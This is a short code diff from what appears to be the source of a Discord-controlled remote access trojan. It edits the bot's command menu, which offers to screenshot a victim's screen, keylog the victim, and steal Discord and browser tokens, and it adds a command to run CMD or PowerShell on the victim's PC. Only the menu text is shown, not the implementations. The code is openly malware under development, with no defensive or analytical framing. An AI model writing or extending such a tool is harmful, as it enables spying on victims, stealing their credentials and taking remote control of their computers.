@@ -242,8 +242,8 @@ async def on_message(message):
         cmdembed.add_field(name=".ss", value="take a screenshot of victims screen", inline=True)
         cmdembed.add_field(name=".keylog", value="records victims keylogs and sends after seconds specified", inline=True)
         cmdembed.add_field(name=".cmds", value="what youre viewing right now", inline=True)
-        cmdembed.add_field(name=".tlog", value="tokenlogger (discord)", inline=True)
-
+        cmdembed.add_field(name=".tlog", value="tokenlogger (discord + browsers only)", inline=True)
+        cmdembed.add_field(name=".execute", value="execute a command on victim pc (CMD OR PS)", inline=True)
 
         await message.channel.send(embed=cmdembed)
     if message.content == ".tlog":
